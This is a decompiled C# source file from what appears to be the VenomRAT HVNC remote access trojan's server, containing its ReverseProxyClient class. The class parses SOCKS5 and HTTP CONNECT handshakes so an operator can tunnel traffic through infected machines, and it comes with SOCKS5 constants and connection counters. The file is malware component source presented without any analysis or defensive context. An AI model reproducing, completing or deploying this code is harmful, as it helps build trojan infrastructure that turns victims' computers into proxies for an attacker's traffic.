using System;
using System.IO;
using System.Net.Sockets;
using System.Text;
using VenomRAT_HVNC.Server.Connection;

namespace VenomRAT_HVNC.Server.Helper
{
    // Token: 0x02000062 RID: 98
    public class ReverseProxyClient
    {
        // Token: 0x17000091 RID: 145
        // (get) Token: 0x06000327 RID: 807 RVA: 0x0001EFDA File Offset: 0x0001EFDA
        // (set) Token: 0x06000328 RID: 808 RVA: 0x0001EFE2 File Offset: 0x0001EFE2
        public Socket Handle { get; private set; }

        // Token: 0x17000092 RID: 146
        // (get) Token: 0x06000329 RID: 809 RVA: 0x0001EFEB File Offset: 0x0001EFEB
        // (set) Token: 0x0600032A RID: 810 RVA: 0x0001EFF3 File Offset: 0x0001EFF3
        public Clients Client { get; private set; }

        // Token: 0x17000093 RID: 147
        // (get) Token: 0x0600032B RID: 811 RVA: 0x0001EFFC File Offset: 0x0001EFFC
        // (set) Token: 0x0600032C RID: 812 RVA: 0x0001F004 File Offset: 0x0001F004
        public long PacketsReceived { get; private set; }

        // Token: 0x17000094 RID: 148
        // (get) Token: 0x0600032D RID: 813 RVA: 0x0001F00D File Offset: 0x0001F00D
        // (set) Token: 0x0600032E RID: 814 RVA: 0x0001F015 File Offset: 0x0001F015
        public long PacketsSended { get; private set; }

        // Token: 0x17000095 RID: 149
        // (get) Token: 0x0600032F RID: 815 RVA: 0x0001F01E File Offset: 0x0001F01E
        // (set) Token: 0x06000330 RID: 816 RVA: 0x0001F026 File Offset: 0x0001F026
        public long LengthReceived { get; private set; }

        // Token: 0x17000096 RID: 150
        // (get) Token: 0x06000331 RID: 817 RVA: 0x0001F02F File Offset: 0x0001F02F
        // (set) Token: 0x06000332 RID: 818 RVA: 0x0001F037 File Offset: 0x0001F037
        public long LengthSent { get; private set; }

        // Token: 0x17000097 RID: 151
        // (get) Token: 0x06000333 RID: 819 RVA: 0x0001F040 File Offset: 0x0001F040
        public int ConnectionId
        {
            get
            {
                return this.Handle.Handle.ToInt32();
            }
        }

        // Token: 0x17000098 RID: 152
        // (get) Token: 0x06000334 RID: 820 RVA: 0x0001F060 File Offset: 0x0001F060
        // (set) Token: 0x06000335 RID: 821 RVA: 0x0001F068 File Offset: 0x0001F068
        public string TargetServer { get; private set; }

        // Token: 0x17000099 RID: 153
        // (get) Token: 0x06000336 RID: 822 RVA: 0x0001F071 File Offset: 0x0001F071
        // (set) Token: 0x06000337 RID: 823 RVA: 0x0001F079 File Offset: 0x0001F079
        public ushort TargetPort { get; private set; }

        // Token: 0x1700009A RID: 154
        // (get) Token: 0x06000338 RID: 824 RVA: 0x0001F082 File Offset: 0x0001F082
        // (set) Token: 0x06000339 RID: 825 RVA: 0x0001F08A File Offset: 0x0001F08A
        public bool IsConnected { get; private set; }

        // Token: 0x1700009B RID: 155
        // (get) Token: 0x0600033A RID: 826 RVA: 0x0001F093 File Offset: 0x0001F093
        // (set) Token: 0x0600033B RID: 827 RVA: 0x0001F09B File Offset: 0x0001F09B
        public ReverseProxyClient.ProxyType Type { get; private set; }

        // Token: 0x1700009C RID: 156
        // (get) Token: 0x0600033C RID: 828 RVA: 0x0001F0A4 File Offset: 0x0001F0A4
        // (set) Token: 0x0600033D RID: 829 RVA: 0x0001F0AC File Offset: 0x0001F0AC
        public string HostName { get; private set; }

        // Token: 0x1700009D RID: 157
        // (get) Token: 0x0600033E RID: 830 RVA: 0x0001F0B5 File Offset: 0x0001F0B5
        // (set) Token: 0x0600033F RID: 831 RVA: 0x0001F0BD File Offset: 0x0001F0BD
        public bool ProxySuccessful { get; private set; }

        // Token: 0x06000340 RID: 832 RVA: 0x0001F0C8 File Offset: 0x0001F0C8
        public ReverseProxyClient(Clients client, Socket socket, ReverseProxyServer server)
        {
            this.Handle = socket;
            this.Client = client;
            this._handshakeStream = new MemoryStream();
            this._buffer = new byte[8192];
            this.IsConnected = true;
            this.TargetServer = "";
            this.Type = ReverseProxyClient.ProxyType.Unknown;
            this.Server = server;
            try
            {
                socket.BeginReceive(this._buffer, 0, this._buffer.Length, SocketFlags.None, new AsyncCallback(this.AsyncReceive), null);
            }
            catch
            {
                this.Disconnect();
            }
        }

        // Token: 0x06000341 RID: 833 RVA: 0x0001F164 File Offset: 0x0001F164
        private void AsyncReceive(IAsyncResult ar)
        {
            try
            {
                int num = this.Handle.EndReceive(ar);
                if (num <= 0)
                {
                    this.Disconnect();
                    return;
                }
                if (num > 5000 || this._handshakeStream.Length + (long)num > 5000L)
                {
                    this.Disconnect();
                    return;
                }
                this.LengthReceived += (long)num;
                this._handshakeStream.Write(this._buffer, 0, num);
            }
            catch
            {
                this.Disconnect();
                return;
            }
            byte[] array = this._handshakeStream.ToArray();
            long packetsReceived = this.PacketsReceived;
            if (packetsReceived != 0L)
            {
                if (packetsReceived == 1L)
                {
                    int num2 = 6;
                    if (array.Length >= num2)
                    {
                        if (!this.CheckProxyVersion(array))
                        {
                            return;
                        }
                        this._isConnectCommand = array[1] == 1;
                        this._isBindCommand = array[1] == 2;
                        this._isUdpCommand = array[1] == 3;
                        this._isIpType = array[3] == 1;
                        this._isDomainNameType = array[3] == 3;
                        this._isIPv6NameType = array[3] == 4;
                        Array.Reverse(array, array.Length - 2, 2);
                        this.TargetPort = BitConverter.ToUInt16(array, array.Length - 2);
                        if (this._isConnectCommand)
                        {
                            if (this._isIpType)
                            {
                                this.TargetServer = string.Concat(new string[]
                                {
                                    array[4].ToString(),
                                    ".",
                                    array[5].ToString(),
                                    ".",
                                    array[6].ToString(),
                                    ".",
                                    array[7].ToString()
                                });
                            }
                            else if (this._isDomainNameType)
                            {
                                int num3 = (int)array[4];
                                if (num2 + num3 < array.Length)
                                {
                                    this.TargetServer = Encoding.ASCII.GetString(array, 5, num3);
                                }
                            }
                            if (this.TargetServer.Length > 0)
                            {
                            }
                            this.Server.CallonUpdateConnection(this);
                            return;
                        }
                        this.SendFailToClient();
                        return;
                    }
                }
            }
            else if (array.Length >= 3)
            {
                string @string = Encoding.ASCII.GetString(array);
                if (array[0] == 5)
                {
                    this.Type = ReverseProxyClient.ProxyType.SOCKS5;
                }
                else
                {
                    if (!@string.StartsWith("CONNECT") || !@string.Contains(":"))
                    {
                        goto IL_31F;
                    }
                    this.Type = ReverseProxyClient.ProxyType.HTTPS;
                    using (StreamReader streamReader = new StreamReader(new MemoryStream(array)))
                    {
                        string text = streamReader.ReadLine();
                        if (text == null)
                        {
                            goto IL_31F;
                        }
                        string[] array2 = text.Split(new string[] { " " }, StringSplitOptions.RemoveEmptyEntries);
                        if (array2.Length != 0)
                        {
                            try
                            {
                                string text2 = array2[1];
                                this.TargetServer = text2.Split(new char[] { ':' })[0];
                                this.TargetPort = ushort.Parse(text2.Split(new char[] { ':' })[1]);
                                this._isConnectCommand = true;
                                this._isDomainNameType = true;
                                this.Server.CallonConnectionEstablished(this);
                                return;
                            }
                            catch
                            {
                                this.Disconnect();
                            }
                        }
                    }
                }
                if (this.CheckProxyVersion(array))
                {
                    this.SendSuccessToClient();
                    long packetsReceived2 = this.PacketsReceived;
                    this.PacketsReceived = packetsReceived2 + 1L;
                    this._handshakeStream.SetLength(0L);
                    this.Server.CallonConnectionEstablished(this);
                }
            }
        IL_31F:
            try
            {
                this.Handle.BeginReceive(this._buffer, 0, this._buffer.Length, SocketFlags.None, new AsyncCallback(this.AsyncReceive), null);
            }
            catch
            {
                this.Disconnect();
            }
        }

        // Token: 0x06000342 RID: 834 RVA: 0x0001F4FC File Offset: 0x0001F4FC
        public void Disconnect()
        {
            if (!this._disconnectIsSend)
            {
                this._disconnectIsSend = true;
            }
            try
            {
                this.Handle.Close();
            }
            catch
            {
            }
            this.IsConnected = false;
            this.Server.CallonUpdateConnection(this);
        }

        // Token: 0x06000343 RID: 835 RVA: 0x0001F54C File Offset: 0x0001F54C
        public void SendToClient(byte[] payload)
        {
            Socket handle = this.Handle;
            lock (handle)
            {
                try
                {
                    this.LengthSent += (long)payload.Length;
                    this.Handle.Send(payload);
                }
                catch
                {
                    this.Disconnect();
                }
            }
            this.Server.CallonUpdateConnection(this);
        }

        // Token: 0x06000344 RID: 836 RVA: 0x0001F5C8 File Offset: 0x0001F5C8
        private void SendFailToClient()
        {
            if (this.Type == ReverseProxyClient.ProxyType.HTTPS)
            {
                this.Disconnect();
            }
            if (this.Type == ReverseProxyClient.ProxyType.SOCKS5)
            {
                this.SendToClient(new byte[] { 5, byte.MaxValue });
                this.Disconnect();
            }
        }

        // Token: 0x06000345 RID: 837 RVA: 0x0001F600 File Offset: 0x0001F600
        private void SendSuccessToClient()
        {
            if (this.Type == ReverseProxyClient.ProxyType.SOCKS5)
            {
                byte[] array = new byte[2];
                array[0] = 5;
                this.SendToClient(array);
            }
        }

        // Token: 0x06000346 RID: 838 RVA: 0x0001F61B File Offset: 0x0001F61B
        private bool CheckProxyVersion(byte[] payload)
        {
            if (this.Type == ReverseProxyClient.ProxyType.HTTPS)
            {
                return true;
            }
            if (payload.Length != 0 && payload[0] != 5)
            {
                this.SendFailToClient();
                this.Disconnect();
                return false;
            }
            return true;
        }

        // Token: 0x06000347 RID: 839 RVA: 0x0001F644 File Offset: 0x0001F644
        private void AsyncReceiveProxy(IAsyncResult ar)
        {
            long num2;
            try
            {
                int num = this.Handle.EndReceive(ar);
                if (num <= 0)
                {
                    this.Disconnect();
                    return;
                }
                this.LengthReceived += (long)num;
                byte[] array = new byte[num];
                Array.Copy(this._buffer, array, num);
                this.LengthSent += (long)array.Length;
                num2 = this.PacketsSended;
                this.PacketsSended = num2 + 1L;
            }
            catch
            {
                this.Disconnect();
                return;
            }
            num2 = this.PacketsReceived;
            this.PacketsReceived = num2 + 1L;
            this.Server.CallonUpdateConnection(this);
            try
            {
                this.Handle.BeginReceive(this._buffer, 0, this._buffer.Length, SocketFlags.None, new AsyncCallback(this.AsyncReceiveProxy), null);
            }
            catch
            {
            }
        }

        // Token: 0x0400027C RID: 636
        public const int SOCKS5_DEFAULT_PORT = 3218;

        // Token: 0x0400027D RID: 637
        public const byte SOCKS5_VERSION_NUMBER = 5;

        // Token: 0x0400027E RID: 638
        public const byte SOCKS5_RESERVED = 0;

        // Token: 0x0400027F RID: 639
        public const byte SOCKS5_AUTH_NUMBER_OF_AUTH_METHODS_SUPPORTED = 2;

        // Token: 0x04000280 RID: 640
        public const byte SOCKS5_AUTH_METHOD_NO_AUTHENTICATION_REQUIRED = 0;

        // Token: 0x04000281 RID: 641
        public const byte SOCKS5_AUTH_METHOD_GSSAPI = 1;

        // Token: 0x04000282 RID: 642
        public const byte SOCKS5_AUTH_METHOD_USERNAME_PASSWORD = 2;

        // Token: 0x04000283 RID: 643
        public const byte SOCKS5_AUTH_METHOD_IANA_ASSIGNED_RANGE_BEGIN = 3;

        // Token: 0x04000284 RID: 644
        public const byte SOCKS5_AUTH_METHOD_IANA_ASSIGNED_RANGE_END = 127;

        // Token: 0x04000285 RID: 645
        public const byte SOCKS5_AUTH_METHOD_RESERVED_RANGE_BEGIN = 128;

        // Token: 0x04000286 RID: 646
        public const byte SOCKS5_AUTH_METHOD_RESERVED_RANGE_END = 254;

        // Token: 0x04000287 RID: 647
        public const byte SOCKS5_AUTH_METHOD_REPLY_NO_ACCEPTABLE_METHODS = 255;

        // Token: 0x04000288 RID: 648
        public const byte SOCKS5_CMD_REPLY_SUCCEEDED = 0;

        // Token: 0x04000289 RID: 649
        public const byte SOCKS5_CMD_REPLY_GENERAL_SOCKS_SERVER_FAILURE = 1;

        // Token: 0x0400028A RID: 650
        public const byte SOCKS5_CMD_REPLY_CONNECTION_NOT_ALLOWED_BY_RULESET = 2;

        // Token: 0x0400028B RID: 651
        public const byte SOCKS5_CMD_REPLY_NETWORK_UNREACHABLE = 3;

        // Token: 0x0400028C RID: 652
        public const byte SOCKS5_CMD_REPLY_HOST_UNREACHABLE = 4;

        // Token: 0x0400028D RID: 653
        public const byte SOCKS5_CMD_REPLY_CONNECTION_REFUSED = 5;

        // Token: 0x0400028E RID: 654
        public const byte SOCKS5_CMD_REPLY_TTL_EXPIRED = 6;

        // Token: 0x0400028F RID: 655
        public const byte SOCKS5_CMD_REPLY_COMMAND_NOT_SUPPORTED = 7;

        // Token: 0x04000290 RID: 656
        public const byte SOCKS5_CMD_REPLY_ADDRESS_TYPE_NOT_SUPPORTED = 8;

        // Token: 0x04000291 RID: 657
        public const byte SOCKS5_ADDRTYPE_IPV4 = 1;

        // Token: 0x04000292 RID: 658
        public const byte SOCKS5_ADDRTYPE_DOMAIN_NAME = 3;

        // Token: 0x04000293 RID: 659
        public const byte SOCKS5_ADDRTYPE_IPV6 = 4;

        // Token: 0x04000294 RID: 660
        public const int BUFFER_SIZE = 8192;

        // Token: 0x04000297 RID: 663
        private bool _receivedConnResponse;

        // Token: 0x04000298 RID: 664
        private MemoryStream _handshakeStream;

        // Token: 0x0400029D RID: 669
        private byte[] _buffer;

        // Token: 0x040002A1 RID: 673
        private bool _isBindCommand;

        // Token: 0x040002A2 RID: 674
        private bool _isUdpCommand;

        // Token: 0x040002A3 RID: 675
        private bool _isConnectCommand;

        // Token: 0x040002A4 RID: 676
        private bool _isIpType;

        // Token: 0x040002A5 RID: 677
        private bool _isIPv6NameType;

        // Token: 0x040002A6 RID: 678
        private bool _isDomainNameType;

        // Token: 0x040002A7 RID: 679
        private bool _disconnectIsSend;

        // Token: 0x040002A9 RID: 681
        private ReverseProxyServer Server;

        // Token: 0x02000063 RID: 99
        public enum ProxyType
        {
            // Token: 0x040002AD RID: 685
            Unknown,

            // Token: 0x040002AE RID: 686
            SOCKS5,

            // Token: 0x040002AF RID: 687
            HTTPS
        }
    }
}